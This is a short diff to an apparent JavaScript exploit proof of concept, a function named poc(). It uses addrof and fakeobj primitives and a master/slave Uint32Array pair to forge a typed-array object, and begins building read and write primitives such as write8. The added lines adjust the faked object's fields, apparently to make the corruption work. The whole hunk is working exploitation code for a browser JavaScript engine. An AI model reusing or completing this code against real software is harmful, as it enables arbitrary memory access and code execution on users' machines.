@@ -385,9 +385,12 @@ function poc() {
     var expl_slave = new Uint32Array(2);
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
+    obj.buffer = expl_slave;
+    m[7] = 1;
     obj.buffer = expl_master;
     m[4] = addrof_expl_slave;
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+    m[7] = 1;
 
     var prim = {
         write8: function (addr, value) {
